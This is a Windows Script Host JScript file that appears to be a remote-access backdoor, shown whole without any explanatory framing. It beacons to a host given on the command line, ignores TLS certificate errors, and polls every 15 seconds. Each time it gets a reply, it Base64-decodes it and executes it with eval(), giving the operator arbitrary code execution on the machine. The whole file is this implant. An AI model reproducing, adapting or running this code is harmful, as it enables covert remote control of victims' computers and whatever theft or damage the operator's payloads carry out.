
var hostnode="";
var t_proto = "http";

if (WScript.arguments.length > 0) {
    hostnode = WScript.arguments(0);
} else {
	WScript.Quit();
}

if (isNaN(hostnode.substring(0,1)) == true) {
    t_proto = "https";
}

var szurl = t_proto + "://" + hostnode;

var szUID = "";

var Base64 = {

    // private property
    _keyStr : "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",
    
    // public method for encoding
    encode : function (input) {
        var output = "";
        var chr1, chr2, chr3, enc1, enc2, enc3, enc4;
        var i = 0;
    
        input = Base64._utf8_encode(input);
    
        while (i < input.length) {
    
            chr1 = input.charCodeAt(i++);
            chr2 = input.charCodeAt(i++);
            chr3 = input.charCodeAt(i++);
    
            enc1 = chr1 >> 2;
            enc2 = ((chr1 & 3) << 4) | (chr2 >> 4);
            enc3 = ((chr2 & 15) << 2) | (chr3 >> 6);
            enc4 = chr3 & 63;
    
            if (isNaN(chr2)) {
                enc3 = enc4 = 64;
            } else if (isNaN(chr3)) {
                enc4 = 64;
            }
    
            output = output +
            this._keyStr.charAt(enc1) + this._keyStr.charAt(enc2) +
            this._keyStr.charAt(enc3) + this._keyStr.charAt(enc4);
    
        }
    
        return output;
    },
    
    // public method for decoding
    decode : function (input) {
        var output = "";
        var chr1, chr2, chr3;
        var enc1, enc2, enc3, enc4;
        var i = 0;
    
        input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");
    
        while (i < input.length) {
    
            enc1 = this._keyStr.indexOf(input.charAt(i++));
            enc2 = this._keyStr.indexOf(input.charAt(i++));
            enc3 = this._keyStr.indexOf(input.charAt(i++));
            enc4 = this._keyStr.indexOf(input.charAt(i++));
    
            chr1 = (enc1 << 2) | (enc2 >> 4);
            chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
            chr3 = ((enc3 & 3) << 6) | enc4;
    
            output = output + String.fromCharCode(chr1);
    
            if (enc3 != 64) {
                output = output + String.fromCharCode(chr2);
            }
            if (enc4 != 64) {
                output = output + String.fromCharCode(chr3);
            }
    
        }
    
        output = Base64._utf8_decode(output);
    
        return output;
    
    },
    
    // private method for UTF-8 encoding
    _utf8_encode : function (string) {
        string = string.replace(/\r\n/g,"\n");
        var utftext = "";
    
        for (var n = 0; n < string.length; n++) {
    
            var c = string.charCodeAt(n);
    
            if (c < 128) {
                utftext += String.fromCharCode(c);
            }
            else if((c > 127) && (c < 2048)) {
                utftext += String.fromCharCode((c >> 6) | 192);
                utftext += String.fromCharCode((c & 63) | 128);
            }
            else {
                utftext += String.fromCharCode((c >> 12) | 224);
                utftext += String.fromCharCode(((c >> 6) & 63) | 128);
                utftext += String.fromCharCode((c & 63) | 128);
            }
    
        }
    
        return utftext;
    },
    
    // private method for UTF-8 decoding
    _utf8_decode : function (utftext) {
        var string = "";
        var i = 0;
        var c = c1 = c2 = 0;
    
        while ( i < utftext.length ) {
    
            c = utftext.charCodeAt(i);
    
            if (c < 128) {
                string += String.fromCharCode(c);
                i++;
            }
            else if((c > 191) && (c < 224)) {
                c2 = utftext.charCodeAt(i+1);
                string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                i += 2;
            }
            else {
                c2 = utftext.charCodeAt(i+1);
                c3 = utftext.charCodeAt(i+2);
                string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                i += 3;
            }
    
        }
    
        return string;
    }
    
}
//    var encodedString = Base64.encode(string);
//    var decodedString = Base64.decode(encodedString);

function getUID()
{
	var suid = WScript.arguments(1);
	var b = Math.floor(Math.random() * 10);
	if (b < 1)
	{
		b = 1;
	}
    var rUID = b.toString();;
	var co = 0;
	if (suid.length > 0)
	{
		co = 8;
	}
	else
	{
		co = 9;
		suid = "";
	}
    for(var i = 1; i < co; i ++)
    {
        var a = Math.floor(Math.random() * 10);
        rUID = rUID + a.toString();
    }
	rUID = rUID + suid;
    return rUID;
}

function postrequest(postdata)
{
    var ServerXmlHttp = new ActiveXObject("MSXML2.ServerXMLHTTP.6.0")
    var szRes = "";
   if (postdata.length > 0) {
        var baseEnData = postdata;
        try{
            ServerXmlHttp.setOption(2, 13056);
            ServerXmlHttp.open("POST", szurl);
            ServerXmlHttp.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            ServerXmlHttp.setRequestHeader("Content-Length", baseEnData.length);
            ServerXmlHttp.send(baseEnData);

            szRes = ServerXmlHttp.responseText;
            ServerXmlHttp = null;
        }
        catch (e) {
        }
    }
    return szRes;
}

function ecval(dt)
{
	eval(dt);
}

szUID = getUID();
while( 1 > 0)
{
    var postD = "a" + szUID + "1";
    var retV = postrequest(postD);

    if(retV.length > 0)
    {
        var szJscr = Base64.decode(retV)+";";
        try
        {
            ecval(szJscr);
        }
        catch (e){

        }
    }
    WScript.Sleep(15 * 1000);
}
